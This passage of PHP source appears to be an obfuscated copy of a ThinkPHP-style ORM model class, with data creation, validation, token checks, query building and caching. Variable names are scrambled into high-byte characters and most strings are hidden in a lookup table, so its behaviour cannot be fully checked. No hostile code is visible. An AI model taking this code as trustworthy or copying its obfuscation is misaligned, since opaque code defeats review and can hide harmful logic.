$ΨΠ—³µΏ[$φυ½ϋϋ]; } return $‘ƒΣύΧ©; } } return null; } public function create($²ΰΙάΛ = '', $ΈΥ¥χ«Ω = '') { $ΡΝ¬ΈΓώ =& $_SERVER[γγάψ½]; if (empty($²ΰΙάΛ)) { $²ΰΙάΛ = $_POST; } elseif (is_object($²ΰΙάΛ)) { $²ΰΙάΛ = get_object_vars($²ΰΙάΛ); } if (empty($²ΰΙάΛ) || !is_array($²ΰΙάΛ)) { $this->error = think_lang($ΡΝ¬ΈΓώ[351]); return !1; } $²ΰΙάΛ = $this->parseFieldsMap($²ΰΙάΛ, 0); $ΈΥ¥χ«Ω = $ΈΥ¥χ«Ω ? $ΈΥ¥χ«Ω : (!empty($²ΰΙάΛ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ΡΝ¬ΈΓώ[353]])) { $ΚΟάπγ = $this->options[$ΡΝ¬ΈΓώ[353]]; unset($this->options[$ΡΝ¬ΈΓώ[353]]); } elseif ($ΈΥ¥χ«Ω == THINK_MODEL_INSERT && isset($this->insertFields)) { $ΚΟάπγ = $this->insertFields; } elseif ($ΈΥ¥χ«Ω == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ΚΟάπγ = $this->updateFields; } if (isset($ΚΟάπγ)) { if (is_string($ΚΟάπγ)) { $ΚΟάπγ = explode($ΡΝ¬ΈΓώ[50], $ΚΟάπγ); } if (think_config($ΡΝ¬ΈΓώ[376])) { $ΚΟάπγ[] = think_config($ΡΝ¬ΈΓώ[377]); } foreach ($²ΰΙάΛ as $α¨ƒω => $Ιω““ϊ) { if (!in_array($α¨ƒω, $ΚΟάπγ)) { unset($²ΰΙάΛ[$α¨ƒω]); } } } if (!$this->autoValidation($²ΰΙάΛ, $ΈΥ¥χ«Ω)) { return !1; } if (!$this->autoCheckToken($²ΰΙάΛ)) { $this->error = think_lang($ΡΝ¬ΈΓώ[378]); return !1; } if ($this->autoCheckFields) { $ΚΟάπγ = $this->getDbFields(); foreach ($²ΰΙάΛ as $α¨ƒω => $Ιω““ϊ) { if (!in_array($α¨ƒω, $ΚΟάπγ)) { unset($²ΰΙάΛ[$α¨ƒω]); } elseif (MAGIC_QUOTES_GPC && is_string($Ιω““ϊ)) { $²ΰΙάΛ[$α¨ƒω] = stripslashes($Ιω““ϊ); } } } $this->autoOperation($²ΰΙάΛ, $ΈΥ¥χ«Ω); $this->data = $²ΰΙάΛ; return $²ΰΙάΛ; } public function autoCheckToken($—Κ·ζξ) { $ΎψΑ›Η =& $_SERVER[γγάψ½]; if (isset($this->options[$ΎψΑ›Η[379]]) && !$this->options[$ΎψΑ›Η[379]]) { return !0; } if (think_config($ΎψΑ›Η[376])) { $ΘΈ‡²φ = think_config($ΎψΑ›Η[377]); if (!isset($—Κ·ζξ[$ΘΈ‡²φ]) || Session::get($ΘΈ‡²φ)) { return !1; } list($θΈΦΑδμ, $ΚΌ―Ξ²) = explode($ΎψΑ›Η[11], $—Κ·ζξ[$ΘΈ‡²φ]); if ($ΚΌ―Ξ² && Session::get($ΘΈ‡²φ . $ΎψΑ›Η[10] . $θΈΦΑδμ) === $ΚΌ―Ξ²) { Session::remove($ΘΈ‡²φ . $ΎψΑ›Η[10] . $θΈΦΑδμ); return !0; } if (think_config($ΎψΑ›Η[380])) { Session::remove($ΘΈ‡²φ . $ΎψΑ›Η[10] . $θΈΦΑδμ); } return !1; } return !0; } public function regex($Ελ‰…, $Σό„®²Ί) { $ƒΔ½ΌΧ =& $_SERVER[γγάψ½]; $γββ²έΥ = array($ƒΔ½ΌΧ[381] => $ƒΔ½ΌΧ[382], $ƒΔ½ΌΧ[383] => $ƒΔ½ΌΧ[384], $ƒΔ½ΌΧ[385] => $ƒΔ½ΌΧ[386], $ƒΔ½ΌΧ[387] => $ƒΔ½ΌΧ[388], $ƒΔ½ΌΧ[389] => $ƒΔ½ΌΧ[390], $ƒΔ½ΌΧ[391] => $ƒΔ½ΌΧ[392], $ƒΔ½ΌΧ[393] => $ƒΔ½ΌΧ[394], $ƒΔ½ΌΧ[368] => $ƒΔ½ΌΧ[395], $ƒΔ½ΌΧ[396] => $ƒΔ½ΌΧ[397]); if (isset($γββ²έΥ[strtolower($Σό„®²Ί)])) { $Σό„®²Ί = $γββ²έΥ[strtolower($Σό„®²Ί)]; } return preg_match($Σό„®²Ί, $Ελ‰…) === 1; } private function autoOperation(&$πΔΰ‡—Δ, $ΔΡΰΪέ”) { $ΰ «™ =& $_SERVER[γγάψ½]; if (!empty($this->options[$ΰ «™[398]])) { $§οΤ’Πη = $this->options[$ΰ «™[398]]; unset($this->options[$ΰ «™[398]]); } elseif (!empty($this->_auto)) { $§οΤ’Πη = $this->_auto; } if (isset($§οΤ’Πη)) { foreach ($§οΤ’Πη as $τ²Ώ”©) { if (empty($τ²Ώ”©[2])) { $τ²Ώ”©[2] = THINK_MODEL_INSERT; } if ($ΔΡΰΪέ” == $τ²Ώ”©[2] || $τ²Ώ”©[2] == THINK_MODEL_BOTH) { switch (trim($τ²Ώ”©[3])) { case $ΰ «™[399]: case $ΰ «™[400]: $Ψ‚ώβ™‰ = isset($τ²Ώ”©[4]) ? (array) $τ²Ώ”©[4] : array(); if (isset($πΔΰ‡—Δ[$τ²Ώ”©[0]])) { array_unshift($Ψ‚ώβ™‰, $πΔΰ‡—Δ[$τ²Ώ”©[0]]); } if ($ΰ «™[399] == $τ²Ώ”©[3]) { $πΔΰ‡—Δ[$τ²Ώ”©[0]] = call_user_func_array($τ²Ώ”©[1], $Ψ‚ώβ™‰); } else { $πΔΰ‡—Δ[$τ²Ώ”©[0]] = call_user_func_array(array(&$this, $τ²Ώ”©[1]), $Ψ‚ώβ™‰); } break; case $ΰ «™[353]: $πΔΰ‡—Δ[$τ²Ώ”©[0]] = $πΔΰ‡—Δ[$τ²Ώ”©[1]]; break; case $ΰ «™[401]: if ($ΰ «™[12] === $πΔΰ‡—Δ[$τ²Ώ”©[0]]) { unset($πΔΰ‡—Δ[$τ²Ώ”©[0]]); } break; case $ΰ «™[402]: default: $πΔΰ‡—Δ[$τ²Ώ”©[0]] = $τ²Ώ”©[1]; } if (!1 === $πΔΰ‡—Δ[$τ²Ώ”©[0]]) { unset($πΔΰ‡—Δ[$τ²Ώ”©[0]]); } } } } return $πΔΰ‡—Δ; } protected function autoValidation($Ιβ―³™, $τ’π) { $½ώΒΌΰ =& $_SERVER[γγάψ½]; if (!empty($this->options[$½ώΒΌΰ[403]])) { $™§²€ΚΒ = $this->options[$½ώΒΌΰ[403]]; unset($this->options[$½ώΒΌΰ[403]]); } elseif (!empty($this->_validate)) { $™§²€ΚΒ = $this->_validate; } if (isset($™§²€ΚΒ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($™§²€ΚΒ as $υ’Χ®όπ => $Ξ©ρ΄‹Ή) { if (empty($Ξ©ρ΄‹Ή[5]) || $Ξ©ρ΄‹Ή[5] == THINK_MODEL_BOTH || $Ξ©ρ΄‹Ή[5] == $τ’π) { if (0 == strpos($Ξ©ρ΄‹Ή[2], $½ώΒΌΰ[404]) && strpos($Ξ©ρ΄‹Ή[2], $½ώΒΌΰ[405])) { $Ξ©ρ΄‹Ή[2] = think_lang(substr($Ξ©ρ΄‹Ή[2], 2, -1)); } $Ξ©ρ΄‹Ή[3] = isset($Ξ©ρ΄‹Ή[3]) ? $Ξ©ρ΄‹Ή[3] : THINK_EXISTS_VALIDATE; $Ξ©ρ΄‹Ή[4] = isset($Ξ©ρ΄‹Ή[4]) ? $Ξ©ρ΄‹Ή[4] : $½ώΒΌΰ[406]; switch ($Ξ©ρ΄‹Ή[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ιβ―³™, $Ξ©ρ΄‹Ή)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($½ώΒΌΰ[12] != trim($Ιβ―³™[$Ξ©ρ΄‹Ή[0]])) { if (!1 === $this->_validationField($Ιβ―³™, $Ξ©ρ΄‹Ή)) { return !1; } } break; default: if (isset($Ιβ―³™[$Ξ©ρ΄‹Ή[0]])) { if (!1 === $this->_validationField($Ιβ―³™, $Ξ©ρ΄‹Ή)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¶Ηξ™¦‡, $ψζ»γ¨”) { if (!1 === $this->_validationFieldItem($¶Ηξ™¦‡, $ψζ»γ¨”)) { if ($this->patchValidate) { $this->error[$ψζ»γ¨”[0]] = $ψζ»γ¨”[2]; } else { $this->error = $ψζ»γ¨”[2]; return !1; } } return; } protected function _validationFieldItem($βΝ¤ΐή, $―Ηω¦Ψ) { $‘Ι–Ψ‘ =& $_SERVER[γγάψ½]; switch (strtolower(trim($―Ηω¦Ψ[4]))) { case $‘Ι–Ψ‘[399]: case $‘Ι–Ψ‘[400]: $ΦΛΡ€ηη = isset($―Ηω¦Ψ[6]) ? (array) $―Ηω¦Ψ[6] : array(); if (is_string($―Ηω¦Ψ[0]) && strpos($―Ηω¦Ψ[0], $‘Ι–Ψ‘[50])) { $―Ηω¦Ψ[0] = explode($‘Ι–Ψ‘[50], $―Ηω¦Ψ[0]); } if (is_array($―Ηω¦Ψ[0])) { foreach ($―Ηω¦Ψ[0] as $ΑίΕί‚) { $ΎΆΞΒϋΪ[$ΑίΕί‚] = $βΝ¤ΐή[$ΑίΕί‚]; } array_unshift($ΦΛΡ€ηη, $ΎΆΞΒϋΪ); } else { array_unshift($ΦΛΡ€ηη, $βΝ¤ΐή[$―Ηω¦Ψ[0]]); } if ($‘Ι–Ψ‘[399] == $―Ηω¦Ψ[4]) { return call_user_func_array($―Ηω¦Ψ[1], $ΦΛΡ€ηη); } else { return call_user_func_array(array(&$this, $―Ηω¦Ψ[1]), $ΦΛΡ€ηη); } case $‘Ι–Ψ‘[407]: return $βΝ¤ΐή[$―Ηω¦Ψ[0]] == $βΝ¤ΐή[$―Ηω¦Ψ[1]]; case $‘Ι–Ψ‘[408]: if (is_string($―Ηω¦Ψ[0]) && strpos($―Ηω¦Ψ[0], $‘Ι–Ψ‘[50])) { $―Ηω¦Ψ[0] = explode($‘Ι–Ψ‘[50], $―Ηω¦Ψ[0]); } $ΘΟ©€ƒ = array(); if (is_array($―Ηω¦Ψ[0])) { foreach ($―Ηω¦Ψ[0] as $ΑίΕί‚) { $ΘΟ©€ƒ[$ΑίΕί‚] = $βΝ¤ΐή[$ΑίΕί‚]; } } else { $ΘΟ©€ƒ[$―Ηω¦Ψ[0]] = $βΝ¤ΐή[$―Ηω¦Ψ[0]]; } if (!empty($βΝ¤ΐή[$this->getPk()])) { $ΘΟ©€ƒ[$this->getPk()] = array($‘Ι–Ψ‘[409], $βΝ¤ΐή[$this->getPk()]); } if ($this->where($ΘΟ©€ƒ)->find()) { return !1; } return !0; default: return $this->check($βΝ¤ΐή[$―Ηω¦Ψ[0]], $―Ηω¦Ψ[1], $―Ηω¦Ψ[4]); } } public function check($®ιήΫ¶, $ζϊ–ς±, $χπί Θ = "\x72\x65\x67\x65\170") { $„ωΈ£ρΕ =& $_SERVER[γγάψ½]; $χπί Θ = strtolower(trim($χπί Θ)); switch ($χπί Θ) { case $„ωΈ£ρΕ[7]: case $„ωΈ£ρΕ[410]: $ΐ€Ιμγ = is_array($ζϊ–ς±) ? $ζϊ–ς± : explode($„ωΈ£ρΕ[50], $ζϊ–ς±); return $χπί Θ == $„ωΈ£ρΕ[7] ? in_array($®ιήΫ¶, $ΐ€Ιμγ) : !in_array($®ιήΫ¶, $ΐ€Ιμγ); case $„ωΈ£ρΕ[411]: case $„ωΈ£ρΕ[412]: if (is_array($ζϊ–ς±)) { $ΐ°±‘χΣ = $ζϊ–ς±[0]; $ρ©•†¬ = $ζϊ–ς±[1]; } else { list($ΐ°±‘χΣ, $ρ©•†¬) = explode($„ωΈ£ρΕ[50], $ζϊ–ς±); } return $χπί Θ == $„ωΈ£ρΕ[411] ? $®ιήΫ¶ >= $ΐ°±‘χΣ && $®ιήΫ¶ <= $ρ©•†¬ : $®ιήΫ¶ < $ΐ°±‘χΣ || $®ιήΫ¶ > $ρ©•†¬; case $„ωΈ£ρΕ[413]: case $„ωΈ£ρΕ[414]: return $χπί Θ == $„ωΈ£ρΕ[413] ? $®ιήΫ¶ == $ζϊ–ς± : $®ιήΫ¶ != $ζϊ–ς±; case $„ωΈ£ρΕ[415]: $ΚΜΊε = mb_strlen($®ιήΫ¶, $„ωΈ£ρΕ[416]); if (strpos($ζϊ–ς±, $„ωΈ£ρΕ[50])) { list($ΐ°±‘χΣ, $ρ©•†¬) = explode($„ωΈ£ρΕ[50], $ζϊ–ς±); return $ΚΜΊε >= $ΐ°±‘χΣ && $ΚΜΊε <= $ρ©•†¬; } else { return $ΚΜΊε == $ζϊ–ς±; } case $„ωΈ£ρΕ[417]: list($¬ζοή°, $Ι½ ΅Ύ¬) = explode($„ωΈ£ρΕ[50], $ζϊ–ς±); if (!is_numeric($¬ζοή°)) { $¬ζοή° = strtotime($¬ζοή°); } if (!is_numeric($Ι½ ΅Ύ¬)) { $Ι½ ΅Ύ¬ = strtotime($Ι½ ΅Ύ¬); } return NOW_TIME >= $¬ζοή° && NOW_TIME <= $Ι½ ΅Ύ¬; case $„ωΈ£ρΕ[418]: return in_array(get_client_ip(), explode($„ωΈ£ρΕ[50], $ζϊ–ς±)); case $„ωΈ£ρΕ[419]: return !in_array(get_client_ip(), explode($„ωΈ£ρΕ[50], $ζϊ–ς±)); case $„ωΈ£ρΕ[406]: default: return $this->regex($®ιήΫ¶, $ζϊ–ς±); } } public function query($½·γ§³β, $Χ°–ξΪ = false) { $‰‘ι¨ =& $_SERVER[γγάψ½]; if (!is_bool($Χ°–ξΪ) && !is_array($Χ°–ξΪ)) { $Χ°–ξΪ = func_get_args(); array_shift($Χ°–ξΪ); } $½·γ§³β = str_replace(array($‰‘ι¨[288], $‰‘ι¨[420]), $‰‘ι¨[53], $½·γ§³β); $½·γ§³β = $this->parseSql($½·γ§³β, $Χ°–ξΪ); return $this->db->query($½·γ§³β); } public function execute($πΒ° , $ΕμοΈυ = false) { if (!is_bool($ΕμοΈυ) && !is_array($ΕμοΈυ)) { $ΕμοΈυ = func_get_args(); array_shift($ΕμοΈυ); } $πΒ°  = $this->parseSql($πΒ° , $ΕμοΈυ); return $this->db->execute($πΒ° ); } protected function parseSql($±Ϊ§ε½ώ, $β‹δη—) { $Ύδ¦§ =& $_SERVER[γγάψ½]; if (!0 === $β‹δη—) { $”ΏΛΏΤ = $this->_parseOptions(); $±Ϊ§ε½ώ = $this->db->parseSql($±Ϊ§ε½ώ, $”ΏΛΏΤ); } elseif (is_array($β‹δη—)) { $β‹δη— = array_map(array($this->db, $Ύδ¦§[421]), $β‹δη—); $±Ϊ§ε½ώ = vsprintf($±Ϊ§ε½ώ, $β‹δη—); } else { $±Ϊ§ε½ώ = strtr($±Ϊ§ε½ώ, array($Ύδ¦§[422] => $this->getTableName(), $Ύδ¦§[423] => think_config($Ύδ¦§[324]))); } $this->db->setModel($this->name); return $±Ϊ§ε½ώ; } public function db($® έ’³ = '', $’Ό‘¨¨‰ = '', $«Ρ•ξΏο = array()) { $¥ώΙ®§° =& $_SERVER[γγάψ½]; if ($¥ώΙ®§°[12] === $® έ’³ && $this->db) { return $this->db; } static $ϊΣΤ Π­ = array(); static $Ό„Ρ­Ϋυ = array(); if (!isset($Ό„Ρ­Ϋυ[$® έ’³]) || isset($Ό„Ρ­Ϋυ[$® έ’³]) && $’Ό‘¨¨‰ && $ϊΣΤ Π­[$® έ’³] != $’Ό‘¨¨‰) { if (!empty($’Ό‘¨¨‰) && is_string($’Ό‘¨¨‰) && !1 === strpos($’Ό‘¨¨‰, $¥ώΙ®§°[8])) { $’Ό‘¨¨‰ = think_config($’Ό‘¨¨‰); } $® έ’³ = think_guid($’Ό‘¨¨‰); $Ό„Ρ­Ϋυ[$® έ’³] = Db::getInstance($’Ό‘¨¨‰); } elseif (NULL === $’Ό‘¨¨‰) { $Ό„Ρ­Ϋυ[$® έ’³]->close(); unset($Ό„Ρ­Ϋυ[$® έ’³]); return; } if (!empty($«Ρ•ξΏο)) { if (is_string($«Ρ•ξΏο)) { parse_str($«Ρ•ξΏο, $«Ρ•ξΏο); } foreach ($«Ρ•ξΏο as $‘ΏΔ»­„ => $ΥύϋΜ²) { $this->setProperty($‘ΏΔ»­„, $ΥύϋΜ²); } } $ϊΣΤ Π­[$® έ’³] = $’Ό‘¨¨‰; $this->db = $Ό„Ρ­Ϋυ[$® έ’³]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $«ζ‘Ϋ¶Ω = get_class($this); if ($«ζ‘Ϋ¶Ω == $_SERVER[γγάψ½][424]) { return $this->name; } $this->name = substr($«ζ‘Ϋ¶Ω, 0, -5); } return $this->name; } public function getTableName() { $ή©σι =& $_SERVER[γγάψ½]; if (empty($this->trueTableName)) { $‚¦οη† = !empty($this->tablePrefix) ? $this->tablePrefix : $ή©σι[12]; if (!empty($this->tableName)) { $‚¦οη† .= $this->tableName; } else { $‚¦οη† .= think_parse_name($this->name); } $this->trueTableName = strtolower($‚¦οη†); } return (!empty($this->dbName) ? $this->dbName . $ή©σι[10] : $ή©σι[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $υβώ·¬• =& $_SERVER[γγάψ½]; return isset($this->fields[$υβώ·¬•[331]]) ? $this->fields[$υβώ·¬•[331]] : $this->pk; } public function getDbFields() { $΅•ςΦϊ =& $_SERVER[γγάψ½]; if (isset($this->options[$΅•ςΦϊ[359]])) { $φ„π άρ = $this->db->getFields($this->options[$΅•ςΦϊ[359]]); return $φ„π άρ ? array_keys($φ„π άρ) : !1; } if ($this->fields) { $φ„π άρ = $this->fields; unset($φ„π άρ[$΅•ςΦϊ[330]], $φ„π άρ[$΅•ςΦϊ[331]], $φ„π άρ[$΅•ςΦϊ[332]], $φ„π άρ[$΅•ςΦϊ[329]]); return $φ„π άρ; } return !1; } public function data($­ΰ„ΉΓ = '') { $¨¦±™κ =& $_SERVER[γγάψ½]; if ($¨¦±™κ[12] === $­ΰ„ΉΓ && !empty($this->data)) { return $this->data; } if (is_object($­ΰ„ΉΓ)) { $­ΰ„ΉΓ = get_object_vars($­ΰ„ΉΓ); } elseif (is_string($­ΰ„ΉΓ)) { parse_str($­ΰ„ΉΓ, $­ΰ„ΉΓ); } elseif (!is_array($­ΰ„ΉΓ)) { think_exception(think_lang($¨¦±™κ[351])); } $this->data = $­ΰ„ΉΓ; return $this; } public function join($αΰνκΎ) { $¬£νµξ =& $_SERVER[γγάψ½]; if (is_array($αΰνκΎ)) { $this->options[$¬£νµξ[362]] = $αΰνκΎ; } elseif (!empty($αΰνκΎ)) { $this->options[$¬£νµξ[362]][] = $αΰνκΎ; } return $this; } public function union($‰θ²ƒ±Ό, $ζέ§”Ψ = false) { $Ξ«΄½ΩΛ =& $_SERVER[γγάψ½]; if (empty($‰θ²ƒ±Ό)) { return $this; } if ($ζέ§”Ψ) { $this->options[$Ξ«΄½ΩΛ[425]][$Ξ«΄½ΩΛ[426]] = !0; } if (is_object($‰θ²ƒ±Ό)) { $‰θ²ƒ±Ό = get_object_vars($‰θ²ƒ±Ό); } if (is_string($‰θ²ƒ±Ό)) { $‡Λ¤©― = $‰θ²ƒ±Ό; } elseif (is_array($‰θ²ƒ±Ό)) { if (isset($‰θ²ƒ±Ό[0])) { $this->options[$Ξ«΄½ΩΛ[425]] = array_merge($this->options[$Ξ«΄½ΩΛ[425]], $‰θ²ƒ±Ό); return $this; } else { $‡Λ¤©― = $‰θ²ƒ±Ό; } } else { think_exception(think_lang($Ξ«΄½ΩΛ[351])); } $this->options[$Ξ«΄½ΩΛ[425]][] = $‡Λ¤©―; return $this; } public function cache($ηχƒ = true, $βƒ·»βΧ = null, $δ·½η = '') { $‹ςεςή =& $_SERVER[γγάψ½]; if (!1 !== $ηχƒ) { $this->options[$‹ςεςή[427]] = array($‹ςεςή[97] => $ηχƒ, $‹ςεςή[417] => $βƒ·»βΧ, $‹ςεςή[33] => $δ·½η); } return $this; } public function field($³Ό­τβ, $­΅­Ϊΐ = false) { $±υ„…΅Η =& $_SERVER[γγάψ½]; if (!0 === $³Ό­τβ) { $Ν¤ήΣ· = $this->getDbFields(); $³Ό­τβ = $Ν¤ήΣ· ? $Ν¤ήΣ· : $±υ„…΅Η[223]; } elseif ($­΅­Ϊΐ) { if (is_string($³Ό­τβ)) { $³Ό­τβ = explode($±υ„…΅Η[50], $³Ό­τβ); } $Ν¤ήΣ· = $this->getDbFields(); $³Ό­τβ = $Ν¤ήΣ· ? array_diff($Ν¤ήΣ·, $³Ό­τβ) : $³Ό­τβ; } $this->options[$±υ„…΅Η[353]] = $³Ό­τβ; return $this; } public function scope($ή΅ΑΕ“ = '', $έ•ζΜΫκ = NULL) { $ηρ±’· =& $_SERVER[γγάψ½]; if ($ηρ±’·[12] === $ή΅ΑΕ“) { if (isset($this->_scope[$ηρ±’·[37]])) { $γΈΈύ³Γ = $this->_scope[$ηρ±’·[37]]; } else { return $this; } } elseif (is_string($ή΅ΑΕ“)) { $½»τ = explode($ηρ±’·[50], $ή΅ΑΕ“); $γΈΈύ³Γ = array(); foreach ($½»τ as $ύ½ΉΚ ) { if (!isset($this->_scope[$ύ½ΉΚ ])) { continue; } $γΈΈύ³Γ = array_merge($γΈΈύ³Γ, $this->_scope[$ύ½ΉΚ ]); } if (!empty($έ•ζΜΫκ) && is_array($έ•ζΜΫκ)) { $γΈΈύ³Γ = array_merge($γΈΈύ³Γ, $έ•ζΜΫκ); } } elseif (is_array($ή΅ΑΕ“)) { $γΈΈύ³Γ = $ή΅ΑΕ“; } if (is_array($γΈΈύ³Γ) && !empty($γΈΈύ³Γ)) { $this->options = array_merge($this->options, array_change_key_case($γΈΈύ³Γ)); } return $this; } public function where($ΤΘΰτ¤Ι, $‰ΐ©Β… = null) { $ΤΫΎΖ =& $_SERVER[γγάψ½]; if (!is_null($‰ΐ©Β…) && is_string($ΤΘΰτ¤Ι)) { if (!is_array($‰ΐ©Β…)) { $‰ΐ©Β… = func_get_args(); array_shift($‰ΐ©Β…); } $‰ΐ©Β… = array_map(array($this->db, $ΤΫΎΖ[421]), $‰ΐ©Β…); $ΤΘΰτ¤Ι = vsprintf($ΤΘΰτ¤Ι, $‰ΐ©Β…); } elseif (is_object($ΤΘΰτ¤Ι)) { $ΤΘΰτ¤Ι = get_object_vars($ΤΘΰτ¤Ι); } elseif (is_array($ΤΘΰτ¤Ι)) { foreach ($ΤΘΰτ¤Ι as $ή„ύ·ΜΎ => $σΰ«®„κ) { if ((is_numeric($ή„ύ·ΜΎ) || !$ή„ύ·ΜΎ) && is_string($σΰ«®„κ)) { if (strpos($σΰ«®„κ, $ΤΫΎΖ[428]) === 0) { continue; } think_trace($ΤΫΎΖ[429], $ΤΫΎΖ[12], $ΤΫΎΖ[49]); die; } } } if (is_string($ΤΘΰτ¤Ι) && $ΤΫΎΖ[12] != $ΤΘΰτ¤Ι) { $λΥ¤ύ = array(); $λΥ¤ύ[$ΤΫΎΖ[430]] = $ΤΘΰτ¤Ι; $ΤΘΰτ¤Ι = $λΥ¤ύ; } if (isset($this->options[$ΤΫΎΖ[355]])) { $this->options[$ΤΫΎΖ[355]] = array_merge($this->options[$ΤΫΎΖ[355]], $ΤΘΰτ¤Ι); } else { $this->options[$ΤΫΎΖ[355]] = $ΤΘΰτ¤Ι; } return $this; } public function limit($ΙλΠψήΫ, $°…¨ωΞ = null) { $ΪΨ£Α¦ =& $_SERVER[γγάψ½]; $this->options[$ΪΨ£Α¦[370]] = is_null($°…¨ωΞ) ? $ΙλΠψήΫ : $ΙλΠψήΫ . $ΪΨ£Α¦[50] . $°…¨ωΞ; return $this; } public function page($π²–£Ψ, $Θο΄Ό‘“ = null) { $Ύ”Ό‡™χ =& $_SERVER[γγάψ½]; $this->options[$Ύ”Ό‡™χ[431]] = is_null($Θο΄Ό‘“) ? $π²–£Ψ : $π²–£Ψ . $Ύ”Ό‡™χ[50] . $Θο΄Ό‘“; return $this; } public function comment($³ί†ύο) { $this->options[$_SERVER[γγάψ½][432]] = $³ί†ύο; return $this; } public function setProperty($εύγΧσ, $ξ„£¤ήΌ) { if (property_exists($this, $εύγΧσ)) { $this->{$εύγΧσ} = $ξ„£¤ήΌ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\x54\x69\155\145", "\164\x69\x6d\145", "\x69\156\x73\x65\162\164\54\x75\x70\x64\141\x74\x65", "\146\x75\156\x63\164\151\157\156"), array("\143\162\x65\x61\164\145\124\x69\x6d\145", "\164\x69\x6d\x65", "\151\x6e\163\145\162\x74", "\146\x75\x6e\x63\164\x69\x6f\156")); public function setDataAuto($¥ζΛπΗ) { $this->dataAuto = $¥ζΛπΗ; } public function __construct($άΔ¬ΣΫ = '', $τς‰ο¬― = '', $Ή‹±Ζ = '') { parent::__construct($άΔ¬ΣΫ, $τς‰ο¬―, $Ή‹±Ζ); } protected $tableMeta = array(); protected function _beforeInsert(&$ς«νΧ™±, $φΈΨς¤‚) { $ϊ³¶ΐΥΆ =& $_SERVER[γγάψ½]; if (!$this->checkDataAutoHas($ϊ³¶ΐΥΆ[433])) { return; } $this->dataBeforeFilter($ς«νΧ™±, $ϊ³¶ΐΥΆ[433]); } protected function _beforeUpdate(&$ωΣΩξιΞ, $νΜΨψ΅‰) { $δΒΏϋό— =& $_SERVER[γγάψ½]; if (!$this->checkDataAutoHas($δΒΏϋό—[434])) { return; } $this->dataBeforeFilter($ωΣΩξιΞ, $δΒΏϋό—[434]); } protected function _afterSelect(&$΅ΌΊ§›, $έΥ¬¦Ζ) { if (!is_array($΅ΌΊ§›)) { return; } if (!$this->checkDataAutoHas($_SERVER[γγάψ½][435])) { return; } foreach ($΅ΌΊ§› as &$Ψώ•’φ™) { $this->dataAfterFilter($Ψώ•’φ™); } unset($Ψώ•’φ™); } protected function _afterFind(&$Έ½›ΑΟ, $‡ΰ–δ) { if (!is_array($Έ½›ΑΟ)) { return; } if (!$this->checkDataAutoHas($_SERVER[γγάψ½][435])) { return; } $this->dataAfterFilter($Έ½›ΑΟ); } public static function textEncode($­αο›’ϊ) { if (!$­αο›’ϊ) { return $­αο›’ϊ; } $σƒΞΙ = json_encode($­αο›’ϊ); $σƒΞΙ = preg_replace_callback($_SERVER[γγάψ½][436], function ($‹νεΣα) { return addslashes($‹νεΣα[0]); }, $σƒΞΙ); return json_decode($σƒΞΙ); } public static function textDecode($ΜΓΣ­›) { $¶ΖοΒ¬› =& $_SERVER[γγάψ½]; $—Φ»³… = json_encode($ΜΓΣ­›); $—Φ»³… = preg_replace_callback($¶ΖοΒ¬›[437], function ($Ύ»‡Ύ) { return $_SERVER[γγάψ½][100]; }, $—Φ»³…); return json_decode($—Φ»³…); } public function setAutoIncrement($›ƒΰ•Α¶) { $ΕΔ‘¥ψ• = array($this->getPk() => $›ƒΰ•Α¶); $ΐ΄‹© = $this->data($ΕΔ‘¥ψ•)->add(); if ($ΐ΄‹©) { $this->delete($ΐ΄‹©); } } public function getAutoIncrement() { $σσ—¬ = $this->getTableName(); $όκζ½ι = $this->max($this->getPk()); $ό΅°Εµ = $this->query("\x73\x68\x6f\167\x20\164\141\x62\154\145\40\x73\x74\141\x74\165\x73\40\x77\x68\x65\x72\145\40\116\x61\x6d\145\x3d\x27{$σσ—¬}\47"); $ΎΣϋ½ΛΒ = $ό΅°Εµ[0][$_SERVER[γγάψ½][438]]; $χλύ± = max($όκζ½ι, $ΎΣϋ½ΛΒ); return $χλύ±; } protected function _callBefore($®ϊ³®‡®, $ƒηϋΛ‘ό) { return $this->cacheCallCheck($®ϊ³®‡®, $ƒηϋΛ‘ό, !1); } protected function _callAfter($›ο§”κΌ, $¥κΠ„–‘) { return $this->cacheCallCheck($›ο§”κΌ, $¥κΠ„–‘, !0); } protected function cacheFunctionAlias($ΔΟ”ΡδΩ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ΫΎα―Χ, $ζι°ΥΝ, $δυΡϊΈΨ = false) { $Έ¤£«µθ =& $_SERVER[γγάψ½]; $Ε¶κμ² = $this->cacheFunctionAlias($ζι°ΥΝ); if (!$Ε¶κμ²) { return; } foreach ($Ε¶κμ² as $γΔ†ι‹π => $ΝΣΣ§φ) { $ΔΪΆσ¶΄ = $ΝΣΣ§φ[0]; $ΎρΣ°άΒ = explode($Έ¤£«µθ[50], $ΝΣΣ§φ[1]); $ψ°Ρς΅ξ = isset($ΝΣΣ§φ[2]) ? $ΝΣΣ§φ[2] : $Έ¤£«µθ[12]; if ($ΫΎα―Χ == $γΔ†ι‹π) { return $this->cacheFunctionGet($γΔ†ι‹π, $ΔΪΆσ¶΄, $ψ°Ρς΅ξ); } if ($δυΡϊΈΨ && in_array($ΫΎα―Χ, $ΎρΣ°άΒ)) { $this->cacheFunctionClear($γΔ†ι‹π, $ΔΪΆσ¶΄, $ψ°Ρς΅ξ); } } } public function cacheFunctionGet($―θοΌπ, $„ψΤΚ, $ΒΌί¤δ = '') { $Κΐφχ° = $this->cacheKeyMake($―θοΌπ, $„ψΤΚ, $ΒΌί¤δ); $ΣύεΪσ = Cache::get($Κΐφχ°); if 